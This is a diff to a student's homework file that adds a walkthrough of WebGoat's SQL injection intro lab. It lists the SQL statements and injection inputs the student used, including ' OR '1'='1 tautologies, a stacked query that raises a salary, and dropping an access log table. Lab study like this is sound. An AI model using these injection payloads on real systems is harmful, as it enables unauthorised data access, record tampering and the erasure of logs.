@@ -65,7 +65,32 @@ I think the CIA triade is a good point and should be discussed more, I think tha
 concpets you may have heard about before but do not truly understand. I would not start with example of attacks, tools, etc, as levels in class vary greatyl.
 
 ## p) Voluntary bonus: Johnny Tables. Solve Webgoat: A1 Injection (intro).
-
-
-
-
+### SQL Injection intro
+- Found the department for employee Bob using the following SQL statement
+```SQL
+SELECT department FROM employees WHERE first_name = 'Bob';
+```
+- Set Tobi's department to Sales using the following SQL statement;
+```SQL
+UPDATE employees SET department = 'Sales' WHERE first_name='Tobi';
+```
+- Added the column phone in table employees using SQL
+```SQL
+ALTER TABLE employees ADD phone varchar(20);
+```
+- Granted role UnauthorizedUser the right to alter Tables
+```SQL
+GRANT ALTER TABLE TO UnauthorizedUser;
+```
+- SQL injections consist of inserting SQL statements from the client's user input to the system.
+- Done the query to access all users
+```SQL
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
+```
+- Completed the SQL injection to get all user's data using 0 as login_count and "1 or 1=1" as user_id parameter
+- Completed the SQL injection to get all user's data using *' OR '1'='1* for both parameter
+- Completed the SQL injection to better my salary using *'; UPDATE employees SET salary = 300000 WHERE last_name = 'Smith*
+- Dropped the access_log table using
+```SQL
+DROP TABLE access_log
+````
